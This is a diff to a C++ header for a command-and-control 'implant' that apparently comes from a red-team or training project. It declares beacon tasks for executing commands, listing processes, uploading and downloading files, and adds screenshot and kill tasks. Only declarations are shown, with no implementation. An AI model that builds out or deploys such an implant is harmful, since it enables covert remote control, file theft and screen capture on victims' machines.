@@ -8,8 +8,16 @@
 #include <variant>
 #include <string>
 #include <string_view>
+#include <array>
+#include <sstream>
+#include <fstream>
+#include <cstdlib>
+#include <istream>
+#include <atlimage.h>
 
 #include <boost/property_tree/ptree.hpp>
+
+#pragma comment (lib,"gdiplus.lib")
 
 // Define implant configuration
 struct Configuration {
@@ -79,6 +87,15 @@ struct ListRunningProcesses {
 	const std::string id;
 };
 
+// KillBeaconProcess
+// -------------------------------------------------------------------------------------------
+struct KillBeaconProcess {
+	KillBeaconProcess(const std::string& id);
+	constexpr static std::string_view key{ "kill" };
+	[[nodiscard]] Result run() const;
+	const std::string id;
+};
+
 // DownloadFileTask
 // -------------------------------------------------------------------------------------------
 struct DownloadFileTask {
@@ -101,10 +118,19 @@ private:
 	const std::string filename;
 };
 
+// ScreenshotTask
+// -------------------------------------------------------------------------------------------
+struct ScreenshotTask {
+	ScreenshotTask(const std::string& id);
+	constexpr static std::string_view key{ "screenshot" };
+	[[nodiscard]] Result run() const;
+	const std::string id;
+};
+
 // ===========================================================================================
 
 // REMEMBER: Any new tasks must be added here too!
-using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, DownloadFileTask, UploadFileTask>;
+using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, KillBeaconProcess, DownloadFileTask, UploadFileTask, ScreenshotTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
 	std::function<void(const Configuration&)> setter);
